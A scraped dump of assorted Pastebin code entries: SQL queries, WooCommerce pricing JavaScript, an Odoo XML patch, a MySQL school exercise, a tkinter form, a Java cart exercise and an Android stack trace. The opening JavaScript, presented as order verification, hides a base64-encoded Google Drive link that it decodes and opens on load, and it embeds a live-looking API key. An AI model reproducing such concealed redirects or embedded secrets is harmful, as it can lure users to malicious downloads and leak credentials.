          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
9znHDVkm,SQL Werahouse,horozov86,SQL,Tuesday 15th of April 2025 07:31:53 AM CDT,"--select
--afaktura.CHANGEDAT,
--afaktura.EXTFAKTURANR
--from atour
--left join atasend on atour.nr = atasend.tournr
--left join ASDGABRECHNUNG on atasend.nr = ASDGABRECHNUNG.ATAID
--left join afaktura on ASDGABRECHNUNG.FK_IDAFAKTURA = afaktura.IDAFAKTURA
--where atour.TOURNUMMER = 489160

select  distinct atour.tournummer
from atour 
left join atasend on atour.nr = atasend.tournr 
left join asendung on atasend.ASENDUNGID = asendung.SENDUNGID 
left join akopf on asendung.AKOPFNR  = akopf.nr
where atour.lockstatus = 1
and akopf.auftragsnummer in

"
mAJv83CR,Untitled,Mixajlov,JavaScript,Tuesday 15th of April 2025 07:26:09 AM CDT,"(function(){
    const colorBook = fieldname17;/*список цветов для выбора в Kolor okładki*/
	const colorTitle = fieldname19; /*список цветов для Kolor napisu*/
    let settingColor = document.querySelectorAll('.coverСolorUpravu .side_by_side .cff-switch');
    let settingColor2 = document.querySelectorAll('.coverСolorNapis .side_by_side .cff-switch');
	let productNumber = document.querySelector('.product .qty'); /* тут берем елемент, что отвечает количество товара */
	let quantity = parseFloat(productNumber.value); /* тут получаем его значение(по сути количество товара) */
	let price = 0;
	const addpline = fieldname20; /* получаем тут поля скидки */
	let priceBrutto = document.querySelector("".price""); /* получаем поле с ценой товара */
	
	/* в следующем блоке условий мы контролируем отслеживание */
	productNumber.addEventListener(""change"", (event) => {
		quantity = parseFloat(productNumber.value);
		if (quantity < 1) {
			quantity = 1;
		}
		calculate();
	});
	if (productNumber) {
        productNumber.previousElementSibling.onclick = function () {
            quantity--;
            if (quantity < 1) {
                quantity = 1;
            }
            calculate();
        }
    }
    if (productNumber) {
        productNumber.nextElementSibling.onclick = function () {
            quantity++;
            calculate();
        }
    }
	
	/* настройка цветов в двух соответствующих полях */
    function colorswich() {
        for (let i = 0; i < settingColor.length; i++) {
            settingColor[i].style.backgroundColor = colorBook[i];
        }
        for (let i = 0; i < settingColor2.length; i++) {
            settingColor2[i].style.background = colorTitle[i];
        }
    }
    colorswich();
	
	/* функция подсчёта */
	function calculate() {
		price = parseFloat((fieldname9+fieldname11+fieldname13) * quantity);
		showPrice(price);
		return price;
	}
	
	/* блок кода для показа цены в соответствующем месте на месте цены */
	function showPrice(params) {
        if (params) {
            let oldCina = params + parseFloat(addpline[0]);
            var totalPrice = String(PREC(params, 2)).replace("". "", "","");
            var oldprice = String(PREC(oldCina, 2)).replace("". "", "","");
            priceBrutto.innerHTML = `
             		 <span class = ""woocommerce-Price-amount amount"">
             		${totalPrice}<span class = ""woocommerce-Price-currencySymbol"" > zł</span></span>
                     <span class = ""woocommerce-Price-amount art"">
                     <bdi>${oldprice}<span class = ""woocommerce-Price-currencySymbol""> zł</span></bdi></span>
                     <div class = ""flag-w""> ${addpline[1]} <span class = ""woocommerce-Price-currencySymbol"">zł</span></div>`;
        }
    }
	
	calculate();
	return PREC(price, 2);
})()"
zbUaNKUv,[QW][4721270]remove_best_before_date_and_change_name_report_lot_label,rht_odoo,XML,Tuesday 15th of April 2025 06:52:21 AM CDT,"<data>
    <!--
    Done by RHT on the 15/04/2025
    Need : remove the best before date from the lot and change the product name to the variant name
    Task : https://www.odoo.com/odoo/project/5686/tasks/4721270
    Pastebin : https://pastebin.com/zbUaNKUv
    -->
    
    <!-- Remove the Best Before (B.b.) date -->
    <xpath expr=""//div[@t-if='o.use_date']"" position=""replace""/>

    <!-- Replace product name with product variant name -->
    <xpath expr=""//div[@t-field='o.product_id.name']"" position=""replace"">
        <t t-set=""product_name"" t-value=""o.product_id.display_name.replace(o.product_id.default_code, '').replace('[','').replace(']','').strip()""/>
        <div class=""o_label_4x12"" t-out=""product_name"" t-att-style=""'width:22mm' if final_barcode else ''""/>
    </xpath>
</data>"
CdZqPtBQ,asd,18126,Java,Tuesday 15th of April 2025 06:04:32 AM CDT,"CREATE DATABASE 42_Iva;
USE 42_Iva;
CREATE TABLE students(
id INT AUTO_INCREMENT PRIMARY KEY,
name VARCHAR(50) NOT NULL,
address VARCHAR(50) NOT NULL,
egn VARCHAR (10) NOT NULL UNIQUE,
phone VARCHAR(10) NULL DEFAULT NULL,
class VARCHAR(5) NULL DEFAULT NULL
);
INSERT INTO students(name, egn, address, phone, class)
VALUES
('Ilyan Ivanov', '9401150045', 'Sofia-Mladost', '0895345123', '10'),
('Ivan Iliev', '9510104512', 'Sofia-Lulin', '0896786453', '11'),
('Elena Petrovs', '9505052154', 'Sofia-Mladost2', '0899123456', '11'),
('Ivan Iliev', '9510104542', 'Sofia-Mladost3', '0897123456', '11'),
('Maria Dimova', '9510104547', 'Sofia-Mladost4', '088898654', '11'),
('Antoaneta Ivanova', '9411104547', 'Sofia-Krasno selo', '0877123456', '10');

CREATE TABLE sports(
id INT AUTO_INCREMENT PRIMARY KEY,
name VARCHAR(50) NOT NULL
);
INSERT INTO sports
VALUES
(NULL, 'football'),
(NULL, 'voleyball');

CREATE  TABLE coaches(
id INT AUTO_INCREMENT PRIMARY KEY,
name VARCHAR(50) NOT NULL,
egn VARCHAR (10) NOT NULL UNIQUE
);
INSERT INTO coaches(name, egn)
VALUES
('Ivan Petrov', '75090412'),
('Petyr Dimitrov', '2345678901'),
('Kaloyan Kolev', '3456789112');
drop table sportGroups;
CREATE TABLE sportGroups(
id INT AUTO_INCREMENT PRIMARY KEY,
location VARCHAR(50) NOT NULL,
dayOfWeek ENUM('Mon', 'Tue', 'Wed', 'Thur', 'Fri', 'Sat', 'Sun'),
hourOfTraining TIME NOT NULL,
sport_id INT NOT NULL,
CONSTRAINT FOREIGN KEY (sport_id) REFERENCES sports(id),
coach_id INT ,
CONSTRAINT FOREIGN KEY(coach_id) REFERENCES coaches(id),
UNIQUE KEY (location, dayOfWeek,  hourOfTraining)
); 
INSERT INTO sportGroups(location, dayOfWeek, hourOfTraining, sport_id, coach_id)
VALUES
('Sofia-Mladost1', 'Mon', '8:00:00', 1, 350),
('Sofia-Mladost1', 'Fri', '9:00:00', 1, 354),
('Sofia-Lulin', 'Fri', '8:00:00', 2, 354),
('Sofia-Lulin', 'Fri', '9:30:00', 2, 355),
('Plovdiv', 'Tue', '12:00:00', 1, 354);
INSERT INTO sportGroups(location, dayOfWeek, hourOfTraining, sport_id, coach_id)
VALUES
('Plovdiv', 'Fri', '12:00:00', 1, null);
drop table sportgr_student;

CREATE TABLE sportgr_student(
student_id INT NOT NULL,
CONSTRAINT FOREIGN KEY (student_id) REFERENCES students(id),
sportgr_id INT NOT NULL,
CONSTRAINT FOREIGN KEY (sportgr_id) REFERENCES sportgroups(id),
PRIMARY KEY (student_id, sportgr_id)
);
INSERT INTO sportgr_student
VALUES
(1,31),
(2,31),
(3,32),
(4,32),
(5,31),
(6,32);

CREATE TABLE programmers(
id INT AUTO_INCREMENT PRIMARY KEY,
	name VARCHAR(255) NOT NULL,
    address VARCHAR(255) NOT NULL,
    startWorkingDate DATE,/**YYYY-MM-DD**/
    teamLead_id INT NULL DEFAULT NULL,
    CONSTRAINT FOREIGN KEY (teamLead_id) REFERENCES programmers(id)
);

INSERT INTO programmers (name, address, startWorkingDate, teamLead_id)
VALUES 
('Ivan Ivanov', 'Sofia', '1999-05-25', NULL),
('Georgi Petkov Todorov', 'Bulgaria - Sofia Nadezhda, bl. 35', '2002-12-01', 1),
('Todor Petkov', 'Sofia - Liylin 7', '2009-11-01', 1),
('Sofiq Dimitrova Petrova', 'Sofia - Mladost 4, bl. 7', '2010-01-01', 1),
('Teodor Ivanov Stoyanov', 'Sofia - Obelya, bl. 48', '2011-10-01', NULL),
('Iliya Stoynov Todorov', 'Sofia Nadezhda, bl. 28', '2000-02-01', 5),
('Mariela Dimitrova Yordanova', 'Sofia - Knyajevo, bl. 17', '2005-05-01', 5),
('Elena Miroslavova Georgieva', 'Sofia - Krasno Selo, bl. 27', '2008-04-01', 5),
('Teodor Milanov Milanov', 'Sofia - Lozenetz', '2012-04-01', 5);
drop table taxesPayment;

CREATE TABLE taxesPayment(
id int auto_increment primary key,
student_id int not null,
group_id int not null,
paymentAmount double not null,
month int,
year int,
dateOfPayment datetime not null,
constraint foreign key (student_id) references students(id),
constraint foreign key (group_id) references sportgroups(id)
);
INSERT INTO taxesPayment (student_id, group_id, paymentAmount, month, year, dateOfPayment) 
VALUES 
(1,11, 200, 3, 2022, now()),
(1,30, 200, 4, 2022, now()),
(1,33, 200, 5, 2022, now()),
(1,11, 200, 6, 2022, now()),
(1,11, 200, 7, 2022, now()),
(1,11, 200, 8, 2022, now()),
(1,30, 200, 9, 2022, now()),
(1,33, 200, 10, 2022, now()),
(1,33, 200, 11, 2022, now()), 
(1,33, 200, 12, 2022, now()),
(4,11, 200, 1, 2022, now()),
(4,49, 200, 2, 2022, now()),
(4,49, 200, 3, 2022, now()),
(4,49, 200, 4, 2022, now()),
(4,49, 200, 5, 2022, now()),
(4,11, 200, 6, 2022, now());

select count(coaches_id) as CountOfGroupWithCoach from sportgroups;
select sum(paymentAmount) as Allpayment 
from taxespayment
where student_id=4;
select max(paymentAmount) as Maxpayment 
from taxespayment
where student_id=4;
select group_id as GroupId, AVG(paymentAmount) as AvgOfAllPaymentPerGroup 
from taxespayment
group by group_id; 
select students.id,students.name as StudentNam, sum(tp.paymentAmount) as SumOfAllPaymentPerGroup ,tp.month as Month 
from taxespayment as tp 
join students on tp.student_id= students.id 
GROUP BY month, student_id
having SumOfAllPaymentPerGroup >100
LIMIT 3; 
CREATE VIEW student_classes
 AS SELECT students.name, students.class, taxespayment.group_id 
 FROM students 
 LEFT JOIN taxespayment
 on students.id = taxespayment.student_id
 JOIN sportgr_student
 on students.id=sportgr_student.student_id
 JOIN sportgroups 
 on sportgr_student.sportgr_id = sportgroups.sport_id
 join coaches 
 on sportgroups.coach_id = coaches.id
 join sports
 on sportgroups.sport_id= sports.id
 where sportgroups.dayOfWeek='Mon' AND sportgroups.hourOfTraining='8:00:00'
 and  coaches.name='Ivan Petrov'
 and sports.name='Football';



-- EX1 - Da se izvedat vsichki sportove sus sportnite grupi, koito sa SAMO za Sofia izpolzvaiki psevdonimi na koloni
SELECT 
    sp.name AS sport_name, 
    sg.location AS group_location,
    sg.dayOfWeek AS group_day,
    sg.hourOfTraining AS training_hour,
    c.name AS coach_name
FROM 
    sportGroups sg
JOIN 
    sports sp ON sg.sport_id = sp.id
JOIN 
    coaches c ON sg.coach_id = c.id
WHERE 
    sg.location LIKE 'Sofia%';
    
-- EX2.1 - Da se sformirat dvoiki uchenici na baza na sportna grupa v koqto trenirat 
SELECT 
    s1.name AS student_1,
    s2.name AS student_2,
    sg.location AS sport_group_location,
    sg.dayOfWeek AS sport_group_day,
    sg.hourOfTraining AS sport_group_time
FROM sportgr_student sg1
JOIN sportgr_student sg2 ON sg1.sportgr_id = sg2.sportgr_id
JOIN students s1 ON sg1.student_id = s1.id
JOIN students s2 ON sg2.student_id = s2.id
JOIN sportGroups sg ON sg.id = sg1.sportgr_id
WHERE sg1.student_id < sg2.student_id;

-- EX2.2 - Da se sformirat dvoiki uchenici na baza na sportna grupa v koqto trenirat 
SELECT DISTINCT 
	s1.name AS student1, 
    s2.name AS student2
FROM sportgr_student sg1
JOIN sportgr_student sg2 ON sg1.sportgr_id = sg2.sportgr_id AND sg1.student_id < sg2.student_id
JOIN students s1 ON sg1.student_id = s1.id
JOIN students s2 ON sg2.student_id = s2.id
JOIN sportgroups sg ON sg.id = sg1.sportgr_id;


-- Using union all
SELECT name, egn, address
FROM students
WHERE address LIKE '%mladost%'

UNION 

SELECT name, egn, address
FROM students
WHERE address LIKE '%mladost%';

delete from coaches where id=1;

ALTER TABLE sportgroups
DROP FOREIGN KEY sportgroups_ibfk_2;

ALTER TABLE sportgroups
ADD CONSTRAINT FOREIGN KEY coach_id_key (coach_id) REFERENCES coaches(id)
ON DELETE SET NULL ON UPDATE CASCADE;

delete from coaches
where id=2;
update coaches
set id=350 where id=3;

DELETE FROM sportgroups
WHERE id=32;

DELIMITER $$
CREATE TRIGGER before_sportgr_delete
BEFORE DELETE ON sportgroups
FOR EACH ROW
BEGIN
    DECLARE new_sportgr_id INT;

    SELECT id INTO new_sportgr_id
    FROM sportgroups
    WHERE location = OLD.location AND id != OLD.id
    LIMIT 1;

    IF new_sportgr_id IS NOT NULL THEN
        UPDATE sportgr_student
        SET sportgr_id = new_sportgr_id
        WHERE sportgr_id = OLD.id;
    END IF;
    
END$$
DELIMITER ;


DELIMITER $$
CREATE procedure checkMonthTax(IN studId INT, IN groupId INT, IN paymentMonth INT, IN paymentYear INT)
BEGIN
DECLARE result char(1);
SET result = 0;
	IF( (SELECT paymentAmount
		FROM taxespayment
        WHERE student_id = studId 
        AND group_id = groupId 
        AND month = paymentMonth 
        AND year = paymentYear) IS NOT NULL)
	THEN
		SET result = 1;
	ELSE
		SET result = 0;
	END IF;
SELECT result AS IsTaxPayed;
END$$;
DELIMITER ;
CALL checkMonthTax(1,1,1,2022);

SELECT * FROM taxespayment;

DELIMITER $$
CREATE procedure checkPaymentPeriod(IN studId INT, IN groupId INT, IN paymentYear INT)
BEGIN
DECLARE countOfMonths int;
DECLARE monthStr VARCHAR(10);
DECLARE yearStr VARCHAR(10);
SET monthStr = 'MONTH';
SET yearStr = 'YEAR';
	SELECT COUNT(*)
	INTO countOfMonths 
	FROM taxespayment
	WHERE student_id = studId
	AND group_id = groupId
	AND year = paymentYear;
    
CASE countOfMonths
	WHEN 0 THEN SELECT 'This student has not paid for this group/year!' as PAYMENT_PERIOD;
    WHEN 1 THEN SELECT CONCAT('ONE_',monthStr) as PAYMENT_PERIOD;
    WHEN 3 THEN SELECT CONCAT('THREE_',monthStr,'S') as PAYMENT_PERIOD;
    WHEN 6 THEN SELECT CONCAT('SIX_',monthStr,'S') as PAYMENT_PERIOD;
    WHEN 12 THEN SELECT yearStr as PAYMENT_PERIOD;
    ELSE
			SELECT CONCAT(countOfMonths, monthStr, 'S') as PAYMENT_PERIOD;
		END CASE;
END$$;
DELIMITER ;


DROP PROCEDURE getAllPaymentsAmount;
DELIMITER $$
CREATE PROCEDURE getAllPaymentsAmount(IN firstMonth INT, IN secMonth INT, IN paymentYear INT, IN studld INT)
BEGIN 
DECLARE iterator int;
DECLARE sum int;
DECLARE paymentAmount_result int;
SET sum = 0;
IF (firstMonth >= secMonth)
	THEN
		SELECT 'Please enter correct months!' as RESULT;
	ELSE IF( (SELECT COUNT(*)
			FROM taxesPayment
			WHERE student_id = studld) = 0) THEN SELECT 'Please enter correct student_id!' as RESULT;
		ELSE
			SET iterator = firstMonth;
			WHILE(iterator >= firstMonth AND iterator <= secMonth)
			DO	
				SELECT paymentAmount
                INTO paymentAmount_result
				FROM taxespayment
				WHERE student_id = studld AND year = paymentYear AND month = iterator;
				SET sum = sum + paymentAmount_result;
				SET iterator = iterator + 1;
			END WHILE;
		END IF;
	END IF;
	SELECT sum AS result;
END;
DELIMITER ;




DROP PROCEDURE IF EXISTS getAllPaymentsAmount;
DELIMITER $$

CREATE PROCEDURE getAllPaymentsAmount(IN firstMonth INT, IN secMonth INT, IN paymentYear INT, IN studld INT)
BEGIN 
    DECLARE iterator INT;
    DECLARE sum INT DEFAULT 0;
    DECLARE paymentAmount_result INT;

    CREATE TEMPORARY TABLE IF NOT EXISTS temp_result (
        result INT
    );

    TRUNCATE TABLE temp_result;

    IF (firstMonth >= secMonth) THEN
        INSERT INTO temp_result (result) VALUES ('Please enter correct months!');
    ELSEIF ( (SELECT COUNT(*) FROM taxesPayment WHERE student_id = studld) = 0) THEN 
        INSERT INTO temp_result (result) VALUES ('Please enter correct student_id!');
    ELSE
        SET iterator = firstMonth;
        WHILE (iterator >= firstMonth AND iterator <= secMonth) DO
            SELECT paymentAmount
            INTO paymentAmount_result
            FROM taxesPayment
            WHERE student_id = studld AND year = paymentYear AND month = iterator;
            
            IF paymentAmount_result IS NOT NULL THEN
                SET sum = sum + paymentAmount_result;
            END IF;

            SET iterator = iterator + 1;
        END WHILE;

        INSERT INTO temp_result (result) VALUES (sum);
    END IF;

    SELECT * FROM temp_result;

    DROP TEMPORARY TABLE IF EXISTS temp_result;
END;
$$
DELIMITER ;
"
rekV7gLJ,dataNone,TestGuy1,JSON,Tuesday 15th of April 2025 06:00:11 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'edd82d2ef6bb9d3f9ce4ff25e8c1197448cf70da0e1610d8fc25f58b0e6b023d5cfe0a0035c43d9564227157db1f751e75825938351e695c72872e84eaec62364b9ccc18ba454e5026b943535abfbe1ff0ab7d26e046704657fc63df6247525f1ea236cd5d3ad278e0f516bb3320ccac866afdd6b9ed1fdff0f56ebaa20e1f43',
  otherdata: [
    '740d7dbd233e3982a41323ad60836339',
    '66e15d9cf5a559d3facc4dbdeaf044f8',
    'f87527728ab28e808d60db4d8025700e',
    '22e4c1c49e3c298022efbdf1f56e7501',
    '60bd6aa4fb0eb75ecf7775569003f431',
    '24aba2370339b43cf75264d9fca030f5',
    '1e57017f55c5d976e3fc8b4738a19752',
    '9443f5f61678c8b0766ba4f62f07a434'
  ]
}"
9p8aRzZi,python 名簿作成フォーム,nealkel,Python,Tuesday 15th of April 2025 04:52:11 AM CDT,"import tkinter as tk
from tkinter import messagebox
import ctypes
import pandas as pd
import os


EXCEL_FILE = ""名簿.xlsx""

user32 = ctypes.windll.user32
imm32 = ctypes.windll.imm32


def set_ime(on=True):
    hwnd = user32.GetForegroundWindow()
    hIMC = imm32.ImmGetContext(hwnd)
    imm32.ImmSetOpenStatus(hIMC, on)
    imm32.ImmReleaseContext(hwnd, hIMC)


def on_focus(event, ime_on=True):
    set_ime(ime_on)


def save_to_excel():
    sei = sei_entry.get()
    mei = mei_entry.get()

    if os.path.exists(EXCEL_FILE):
        df_existing = pd.read_excel(EXCEL_FILE)
    else:
        df_existing = pd.DataFrame(columns=[""苗字"", ""名前""])

    new_data = pd.DataFrame([[sei, mei]], columns=[""苗字"", ""名前""])
    df_all = pd.concat([df_existing, new_data], ignore_index=True)

    df_all.to_excel(EXCEL_FILE, index=False)

    sei_entry.delete(0, tk.END)
    mei_entry.delete(0, tk.END)

    messagebox.showinfo(""保存完了"", ""データをExcelに保存しました。"")


root = tk.Tk()
root.title(""メンバー登録"")
root.geometry(""360x360"")


tk.Label(root, text=""苗字"").grid(row=0, column=0, padx=10, pady=5)
sei_entry = tk.Entry(root)
sei_entry.grid(row=0, column=1, padx=10, pady=5)
sei_entry.bind(""<FocusIn>"", lambda e: on_focus(e, True))

tk.Label(root, text=""名前"").grid(row=1, column=0, padx=10, pady=5)
mei_entry = tk.Entry(root)
mei_entry.grid(row=1, column=1, padx=10, pady=5)
mei_entry.bind(""<FocusIn>"", lambda e: on_focus(e, True))


save_button = tk.Button(root, text=""Excelに保存"", command=save_to_excel)
save_button.grid(row=2, column=0, columnspan=2, pady=10)


root.mainloop()
"
5ar5iHcs,Test,JerixID,C++,Tuesday 15th of April 2025 04:29:46 AM CDT,FEEDBACK ANJAY
AsweaG6u,[NP] Shopping Cart,dzocesrce,Java,Tuesday 15th of April 2025 04:24:32 AM CDT,"import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;

abstract class Product implements Comparable<Product> {
    private String id;
    private String name;
    private int price;

    public Product(String id, String name, int price) {
        this.id = id;
        this.name = name;
        this.price = price;
    }

    public String getId() {
        return id;
    }

    public abstract float getTotalPrice();

    public String getName() {
        return name;
    }

    public int getPrice() {
        return price;
    }
}

class ProductPerKilogram extends Product{
    private float quantity;

    public ProductPerKilogram(String id, String name, int price, float quantity) {
        super(id, name, price);
        this.quantity= quantity;
    }

    public float getTotalPrice(){
        return super.getPrice()*quantity/1000.0f;
    }

    @Override
    public int compareTo(Product o) {
        return Float.compare(this.getTotalPrice(),o.getTotalPrice());
    }

    @Override
    public String toString() {
        return String.format(""%s - %.2f"",super.getId(),getTotalPrice());
    }
}

class WholeProduct extends Product{

    private float quantity;

    public WholeProduct(String id, String name, int price, int quantity) {
        super(id, name, price);
        this.quantity= quantity;
    }

    public float getTotalPrice(){
        return super.getPrice()*quantity;
    }

    @Override
    public int compareTo(Product o) {
        return Float.compare(this.getTotalPrice(),o.getTotalPrice());
    }
    @Override
    public String toString() {
        return String.format(""%s - %.2f"",super.getId(),getTotalPrice());
    }

}


class InvalidOperationException extends Exception{
    public InvalidOperationException(String message) {
        super(message);
    }
}

public class ShoppingTest {

    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        ShoppingCart cart = new ShoppingCart();

        int items = Integer.parseInt(sc.nextLine());
        for (int i = 0; i < items; i++) {
            try {
                cart.addItem(sc.nextLine());
            } catch (InvalidOperationException e) {
                System.out.println(e.getMessage());
            }
        }

        List<Integer> discountItems = new ArrayList<>();
        int discountItemsCount = Integer.parseInt(sc.nextLine());
        for (int i = 0; i < discountItemsCount; i++) {
            discountItems.add(Integer.parseInt(sc.nextLine()));
        }

        int testCase = Integer.parseInt(sc.nextLine());
        if (testCase == 1) {
            cart.printShoppingCart(System.out);
        } else if (testCase == 2) {
            try {
                cart.blackFridayOffer(discountItems, System.out);
            } catch (InvalidOperationException e) {
                System.out.println(e.getMessage());
            }
        } else {
            System.out.println(""Invalid test case"");
        }
    }
}

class ShoppingCart {
    List<Product> products;

    public ShoppingCart() {
        this.products = new ArrayList<>();
    }

    public void addItem(String s) throws InvalidOperationException {
        String[] parts= s.split("";"");
        String id = parts[1];
        String name = parts[2];
        int price = Integer.parseInt(parts[3]);
        float quantity = Float.parseFloat(parts[4]);
        if(quantity==0){
            throw new InvalidOperationException(String.format(""The quantity of the product with id %s can not be 0."",id));
        }
        if(parts[0].equals(""WS"")){
            products.add(new WholeProduct(id,name,price,(int)quantity));
        }
        else{
            products.add(new ProductPerKilogram(id,name,price,quantity));
        }
    }

    public void printShoppingCart(PrintStream out) {

        PrintWriter printWriter= new PrintWriter(out);

        products.stream().sorted(Comparator.reverseOrder()).forEach(i->printWriter.println(i));

        printWriter.flush();
    }

    public void blackFridayOffer(List<Integer> discountItems, PrintStream out) throws InvalidOperationException {
        PrintWriter printWriter= new PrintWriter(out);
        if(discountItems.size()==0)
            throw new InvalidOperationException(""There are no products with discount."");

        products.stream()
                .filter(i->discountItems.contains(Integer.parseInt(i.getId())))
                .map(i -> i.getId() + "" - "" + String.format(""%.2f"", i.getTotalPrice() * 0.1f))
                .forEach(i -> printWriter.println(i));
        printWriter.flush();
    }
}
"
e4D0ZDSx,2025-04-15T11:00:01.388312,powerampache,PHP,Tuesday 15th of April 2025 04:00:02 AM CDT,"1.01-78 (78) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:709)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:210)
	at android.os.Looper.loop(Looper.java:299)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.datasource.HttpDataSource$HttpDataSourceException: java.net.SocketTimeoutException: timeout
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:370)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)
Caused by: java.net.SocketTimeoutException: timeout
	at com.android.okhttp.okio.Okio$3.newTimeoutException(Okio.java:214)
	at com.android.okhttp.okio.AsyncTimeout.exit(AsyncTimeout.java:263)
	at com.android.okhttp.okio.AsyncTimeout$2.read(AsyncTimeout.java:217)
	at com.android.okhttp.okio.RealBufferedSource.indexOf(RealBufferedSource.java:307)
	at com.android.okhttp.okio.RealBufferedSource.indexOf(RealBufferedSource.java:301)
	at com.android.okhttp.okio.RealBufferedSource.readUtf8LineStrict(RealBufferedSource.java:197)
	at com.android.okhttp.internal.http.Http1xStream.readResponse(Http1xStream.java:188)
	at com.android.okhttp.internal.http.Http1xStream.readResponseHeaders(Http1xStream.java:129)
	at com.android.okhttp.internal.http.HttpEngine.readNetworkResponse(HttpEngine.java:750)
	at com.android.okhttp.internal.http.HttpEngine.readResponse(HttpEngine.java:622)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.execute(HttpURLConnectionImpl.java:475)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.getResponse(HttpURLConnectionImpl.java:411)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.getResponseCode(HttpURLConnectionImpl.java:542)
	at com.android.okhttp.internal.huc.DelegatingHttpsURLConnection.getResponseCode(DelegatingHttpsURLConnection.java:106)
	at com.android.okhttp.internal.huc.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:30)
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:366)
	... 7 more
Caused by: java.net.SocketException: Socket closed
	at java.net.SocketInputStream.read(SocketInputStream.java:188)
	at java.net.SocketInputStream.read(SocketInputStream.java:143)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.readFromSocket(ConscryptEngineSocket.java:985)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.processDataFromSocket(ConscryptEngineSocket.java:949)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.readUntilDataAvailable(ConscryptEngineSocket.java:864)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.read(ConscryptEngineSocket.java:837)
	at com.android.okhttp.okio.Okio$2.read(Okio.java:138)
	at com.android.okhttp.okio.AsyncTimeout$2.read(AsyncTimeout.java:213)
	... 20 more

onPlayerError HttpDataSourceException - PlaybackException 
Error Code: 2002. Issues playing this track.
{""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":14},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2002,""extras"":{""mMap"":{}},""timestampMs"":2812168263,""cause"":{""dataSpec"":{""absoluteStreamPosition"":16027381,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":16027381,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2002,""cause"":{""bytesTransferred"":0,""cause"":{""detailMessage"":""Socket closed"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":188,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":143,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":985,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":949,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":864,""methodName"":""readUntilDataAvailable""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":837,""methodName"":""read""},{""declaringClass"":""com.android.okhttp.okio.Okio$2"",""fileName"":""Okio.java"",""lineNumber"":138,""methodName"":""read""},{""declaringClass"":""com.android.okhttp.okio.AsyncTimeout$2"",""fileName"":""AsyncTimeout.java"",""lineNumber"":213,""methodName"":""read""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":307,""methodName"":""indexOf""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":301,""methodName"":""indexOf""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":197,""methodName"":""readUtf8LineStrict""},{""declaringClass"":""com.android.okhttp.internal.http.Http1xStream"",""fileName"":""Http1xStream.java"",""lineNumber"":188,""methodName"":""readResponse""},{""declaringClass"":""com.android.okhttp.internal.http.Http1xStream"",""fileName"